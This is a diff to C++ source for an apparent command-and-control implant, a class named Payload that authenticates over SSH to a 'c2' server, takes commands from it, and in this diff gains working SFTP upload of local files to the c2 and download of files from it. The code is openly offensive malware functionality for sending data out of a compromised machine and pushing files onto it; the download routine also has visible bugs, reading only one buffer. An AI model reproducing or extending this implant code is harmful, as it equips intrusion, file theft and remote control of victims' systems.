@@ -44,7 +44,7 @@ void Payload::handleConnection()
 {
     // authenticate
     std::cout << "[+] Authenticating...\n";
-    int returnCode = ssh_userauth_password(session, NULL, pwd.c_str());
+    int returnCode = ssh_userauth_password(session, nullptr, pwd.c_str());
     if (returnCode != SSH_AUTH_SUCCESS)
     {
         std::cerr << "[-] Error authenticating: " << ssh_get_error(session) << std::endl;
@@ -60,7 +60,6 @@ void Payload::handleConnection()
         tearDown();
         return;
     }
-
     while (true)
     {
         // get cmd from c2
@@ -165,14 +164,136 @@ std::string Payload::rcvMsg()
     return std::string(buffer);
 }
 
+sftp_session Payload::setupSFTP()
+{
+    // create and init SFTP
+    sftp_session sftp = sftp_new(session);
+    if (sftp == nullptr)
+    {
+        std::cerr << "[-] Error allocating SFTP session: " << ssh_get_error(session) << std::endl;
+        return nullptr;
+    }
+    int rc = sftp_init(sftp);
+    if (rc != SSH_OK)
+    {
+        std::cerr << "[-] Error initializing SFTP session: " << sftp_get_error(sftp) << std::endl;
+        sftp_free(sftp);
+        return nullptr;
+    }
+    return sftp;
+}
+
 void Payload::upload(std::string& localFilePath, std::string& remoteFilePath)
 {
-    // TODO
+    std::cout << "[+] Uploading \"" << localFilePath  << "\" to c2 as \"" << remoteFilePath << "\"\n";
+
+    // read the local file
+    auto fileBuffer = readFile(localFilePath);
+
+    // create SFTP session
+    sftp_session sftp;
+    if (!(sftp = setupSFTP()))
+    {
+        std::cerr << "[-] Error setting up SFTP.\n";
+        return;
+    }
+
+    // open the remote file
+    sftp_file file = sftp_open(sftp, remoteFilePath.c_str(), O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
+    if (file == nullptr)
+    {
+        std::cerr << "[-] Can't open file for writing: " << ssh_get_error(session) << std::endl;
+        sftp_free(sftp);
+        return;
+    }
+
+    // write to it
+    auto nwritten = sftp_write(file, fileBuffer.c_str(), fileBuffer.length());
+    if (nwritten != fileBuffer.length())
+    {
+        std::cerr << "[-] Can't write data to file: " << ssh_get_error(session) << std::endl;
+        sftp_close(file);
+        return;
+    }
+
+    // and eventually close it again
+    int rc = sftp_close(file);
+    if (rc != SSH_OK)
+    {
+        std::cerr << "[-] Can't close the written file: " << ssh_get_error(session) << std::endl;
+    }
+
+    // free up the resources
+    sftp_free(sftp);
+
+    std::cout << "[+] Upload finished.\n";
 }
 
 void Payload::download(std::string& remoteFilePath, std::string& localFilePath)
 {
-    // TODO
+
+    std::cout << "[+] Downloading \"" << remoteFilePath << "\" from c2 and saving as \"" << localFilePath << "\"\n";
+
+    // create/open local file to save data in
+    std::ofstream localFile("downloads/" + localFilePath);
+
+    // make download directory if it doesn't exist yet
+    auto dirName = "downloads";
+    if (!dirExists(dirName))
+    {
+        if (mkdir(dirName, 0777) == -1)
+        {
+            std::cout << "[-] Error creating uploads directory!\n";
+        }
+    }
+
+    // create SFTP session
+    sftp_session sftp;
+    if (!(sftp = setupSFTP()))
+    {
+        std::cerr << "[-] Error setting up SFTP.\n";
+        return;
+    }
+
+    // open the remote file
+    sftp_file file = sftp_open(sftp, remoteFilePath.c_str(), O_RDONLY, S_IRWXU);
+    if (file == nullptr)
+    {
+        std::cerr << "[-] Can't open file for writing: " << ssh_get_error(session) << std::endl;
+        sftp_free(sftp);
+        return;
+    }
+
+    // read from it
+    char buffer[MAX_BUFF_SIZE];
+    auto nbytes = sftp_read(file, buffer, sizeof(buffer));
+    if (nbytes < 0)
+    {
+        std::cerr << "[-] Error while reading file: " << ssh_get_error(session) << std::endl;
+        sftp_close(file);
+        return;
+    }
+    // write into local file
+    if (localFile.is_open())
+    {
+        localFile << std::string(buffer);
+    }
+
+    // and eventually close it
+    int rc = sftp_close(file);
+    if (rc != SSH_OK)
+    {
+        std::cerr << "[-] Can't close the read remote file: " << ssh_get_error(session) << std::endl;
+    }
+
+    // clean up resources
+    if (localFile.is_open())
+    {
+        localFile.close();
+    }
+    sftp_free(sftp);
+
+    std::cout << "[+] Download finished.\n";
 }
 
 std::string Payload::execCmd(std::string& cmd)
